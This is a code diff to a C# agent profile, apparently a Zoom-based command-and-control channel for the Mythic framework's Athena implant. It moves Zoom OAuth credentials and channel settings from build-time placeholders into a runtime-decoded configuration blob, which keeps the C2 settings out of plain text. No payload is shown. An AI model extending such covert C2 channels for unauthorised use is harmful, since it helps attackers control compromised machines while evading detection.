@@ -1,4 +1,4 @@
-﻿using Agent.Interfaces;
+using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
 using System.Net;
@@ -27,17 +27,13 @@ namespace Agent.Profiles
         private IMessageManager messageManager { get; set; }
         private ILogger logger { get; set; }
 
-        // ---- C2 parameters (substituted at build time by builder.buildZoom) ----
-        // Fixed %ZOOM_*% placeholders are used (not the bare C2 param names) so
-        // Athena's global text-replace can never collide with literal API field
-        // names such as the OAuth "account_id" form key.
-        private string accountId = "%ZOOM_ACCOUNT_ID%";
-        private string clientId = "%ZOOM_CLIENT_ID%";
-        private string clientSecret = "%ZOOM_CLIENT_SECRET%";
-        private string userId = "%ZOOM_USER_ID%";
-        private string channelId = "%ZOOM_CHANNEL_ID%";
-        private string apiBase = "%ZOOM_API_BASE%";
-        private string oauthBase = "%ZOOM_OAUTH_BASE%";
+        private readonly string accountId;
+        private readonly string clientId;
+        private readonly string clientSecret;
+        private readonly string userId;
+        private readonly string channelId;
+        private readonly string apiBase;
+        private readonly string oauthBase;
 
         // ---- wire protocol constants ----
         private const string DIR_AGENT_TO_SERVER = "O";   // consumed by the Mythic bridge
@@ -69,6 +65,17 @@ namespace Agent.Profiles
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
+            var opts = JsonSerializer.Deserialize(
+                ChannelConfig.Decode(),
+                ZoomChannelOptionsJsonContext.Default.ZoomChannelOptions)
+                ?? throw new InvalidOperationException("Invalid Zoom profile configuration");
+            accountId = opts.AccountId;
+            clientId = opts.ClientId;
+            clientSecret = opts.ClientSecret;
+            userId = opts.UserId;
+            channelId = opts.ChannelId;
+            apiBase = opts.ApiBase;
+            oauthBase = opts.OAuthBase;
 
             HttpClientHandler handler = new HttpClientHandler();
             //Might need to make this configurable
